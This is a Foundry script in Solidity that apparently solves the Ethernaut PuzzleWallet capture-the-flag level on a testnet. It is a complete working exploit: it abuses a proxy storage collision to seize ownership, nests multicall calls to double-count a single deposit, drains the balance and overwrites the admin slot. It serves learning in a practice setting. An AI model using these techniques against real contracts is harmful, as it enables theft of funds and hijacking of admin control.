// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IPuzzleWallet {
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function balances(address x) external returns (uint256);
}

interface IPuzzleProxy is IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function owner() external returns (address);
}

//forge script  --rpc-url sepolia --account metamask  Cracked24_PuzzleWalletScript --broadcast
contract Cracked24_PuzzleWalletScript is Script {
    address ethernaut_implement_contracts;
    address ethernaut_proxy_contracts;

    function setUp() public {
        ethernaut_implement_contracts = vm.parseAddress(vm.envString("PuzzleWallet_implement_address"));
        ethernaut_proxy_contracts = vm.parseAddress(vm.envString("PuzzleWallet_proxy_address"));
    }

    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));

        IPuzzleProxy(ethernaut_proxy_contracts).proposeNewAdmin(player);

        IPuzzleProxy(ethernaut_proxy_contracts).addToWhitelist(player);

        bytes[] memory calldata_deposit = new bytes[](1);
        calldata_deposit[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        bytes[] memory calldata_multi = new bytes[](1);
        calldata_multi[0] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, calldata_deposit);
        bytes[] memory calldata_multi_multi = new bytes[](2);
        calldata_multi_multi[0] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, calldata_deposit);
        calldata_multi_multi[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, calldata_deposit);

        IPuzzleProxy(ethernaut_proxy_contracts).multicall{value: 0.001 ether}(calldata_multi_multi);

        console.log("proxy balances is", ethernaut_proxy_contracts.balance);
        console.log("player balances is", IPuzzleProxy(ethernaut_proxy_contracts).balances(player));

        IPuzzleProxy(ethernaut_proxy_contracts).execute(player, 0.002 ether, "");
        IPuzzleProxy(ethernaut_proxy_contracts).setMaxBalance(uint256(uint160(player)));

        require(IPuzzleProxy(ethernaut_proxy_contracts).owner() == player, "player fail");
        vm.stopBroadcast();
    }
}
